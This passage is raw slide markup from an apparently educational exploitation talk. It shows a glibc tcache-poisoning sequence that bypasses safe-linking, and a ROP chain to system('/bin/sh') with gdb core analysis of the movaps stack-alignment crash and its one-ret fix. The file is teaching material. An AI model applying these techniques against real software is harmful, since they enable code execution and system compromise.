          <p:cNvPr id="214" name="Google Shape;214;p14"/>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III · TRAP 3/3</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="215" name="Google Shape;215;p14"/>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14 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="216" name="Google Shape;216;p14"/>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5484D"/>
              </a:buClr>
              <a:buSzPts val="3400"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="3400">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Trap 3 — system() crashes on a clean chain</a:t>
            </a:r>
            <a:endParaRPr sz="3400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="217" name="Google Shape;217;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1554480"/>
            <a:ext cx="11155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lang="en-US" sz="1700">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>You land execution in system(). ASLR is beaten, the address is right — and it segfaults anyway.</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="218" name="Google Shape;218;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2377440"/>
            <a:ext cx="11155680" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 3125"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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="704088" y="2523744"/>
            <a:ext cx="10753344" cy="117043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pop_rdi; /bin/sh; system     # textbook. and it dies.</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250"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Program received signal SIGSEGV, Segmentation fault.</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250"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>=&gt; 0x7f…  &lt;do_system+363&gt;:  movaps %xmm0,0x50(%rsp)</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="220" name="Google Shape;220;p14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="411480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2200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2200">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>The address was never the problem.</a:t>
            </a:r>
            <a:endParaRPr sz="2200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E6E8EB"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="2200">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>We autopsy this one next.</a:t>
            </a:r>
            <a:endParaRPr sz="2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25" name="Shape 225"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="226" name="Google Shape;226;p15"/>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III · THE WRITE</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="227" name="Google Shape;227;p15"/>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15 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="228" name="Google Shape;228;p15"/>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The poison, done right</a:t>
            </a:r>
            <a:endParaRPr sz="3400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="229" name="Google Shape;229;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1417320"/>
            <a:ext cx="111556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lang="en-US" sz="1700">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Safe-linking + the double-free key mean the naive poison is dead. The count-safe version isn't:</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="230" name="Google Shape;230;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2148840"/>
            <a:ext cx="11155680" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 1667"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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="704088" y="2295144"/>
            <a:ext cx="10753344" cy="24505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mangle = lambda pos, ptr: (pos &gt;&gt; 12) ^ ptr      # safe-linking</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250"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <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free(A); free(B)                 # bin count = 2  (dodges the key check)</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edit(B, p64(mangle(heap+off_B, target)))         # forge the fd</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malloc(sz)                       # returns B</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malloc(sz)  -&gt;  target           # attacker-chosen pointer</a:t>
            </a:r>
            <a:endParaRPr sz="12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36" name="Shape 236"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="237" name="Google Shape;237;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1097280"/>
            <a:ext cx="12191695"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42C"/>
              </a:buClr>
              <a:buSzPts val="21000"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="21000">
                <a:solidFill>
                  <a:srgbClr val="20242C"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ACT IV</a:t>
            </a:r>
            <a:endParaRPr sz="21000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="238" name="Google Shape;238;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="233172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484D"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ACT IV</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="239" name="Google Shape;239;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2743200"/>
            <a:ext cx="111556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5200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="5200">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>The Forensics</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="240" name="Google Shape;240;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="388620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400"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Reading the body.</a:t>
            </a:r>
            <a:endParaRPr sz="1400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="241" name="Google Shape;241;p16"/>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16 / 27</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46" name="Shape 246"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="247" name="Google Shape;247;p17"/>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IV · THE BODY</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="248" name="Google Shape;248;p17"/>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17 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="249" name="Google Shape;249;p17"/>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Load the core. Read cause of death.</a:t>
            </a:r>
            <a:endParaRPr sz="3400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="250" name="Google Shape;250;p17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1554480"/>
            <a:ext cx="11155680" cy="3246120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 1408"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7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="704088" y="1700784"/>
            <a:ext cx="10753344" cy="295351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 gdb ./note core</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Core was generated by `./note'.  Program terminated with SIGSEGV.</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#0  0x7f…  in do_system () at ../sysdeps/…/system.c</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250"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>=&gt; 0x7f…8b3 &lt;do_system+363&gt;:  movaps %xmm0,0x50(%rsp)</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(gdb) p/x $rsp</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3B341"/>
              </a:buClr>
              <a:buSzPts val="1250"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$1 = 0x7ffe…d8        # ends in 8  -&gt;  NOT 16-byte aligned</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="252" name="Google Shape;252;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="493776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800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr i="1" lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>movaps + unaligned rsp = fault. The evidence is unambiguous.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="253" name="Google Shape;253;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9997495" y="5852503"/>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58" name="Shape 258"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="259" name="Google Shape;259;p18"/>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IV · THE FIX</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="260" name="Google Shape;260;p18"/>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18 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="261" name="Google Shape;261;p18"/>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The fix falls out of the fault</a:t>
            </a:r>
            <a:endParaRPr sz="3400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="262" name="Google Shape;262;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1600200"/>
            <a:ext cx="5486400" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 1515"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8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="173736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484D"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>WITHOUT</a:t>
            </a:r>
            <a:endParaRPr sz="1400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="264" name="Google Shape;264;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2148840"/>
            <a:ext cx="5120640" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 20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8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="886968" y="2295144"/>
            <a:ext cx="4718304" cy="19933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pop_rdi + ret</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/bin/sh</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system</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300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>rsp % 16 == 8</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5484D"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>movaps -&gt; SIGSEGV</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="266" name="Google Shape;266;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1600200"/>
            <a:ext cx="5486400" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 1515"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8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="173736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400"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>WITH ONE ret</a:t>
            </a:r>
            <a:endParaRPr sz="1400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="268" name="Google Shape;268;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6355080" y="2148840"/>
            <a:ext cx="5120640" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 20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8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6556248" y="2295144"/>
            <a:ext cx="4718304" cy="19933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pop_rdi + ret</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/bin/sh</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E3B341"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>ret        # +8, re-aligns</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:srgbClr val="E6E8EB"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E6E8EB"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>system</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:srgbClr val="E6E8EB"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
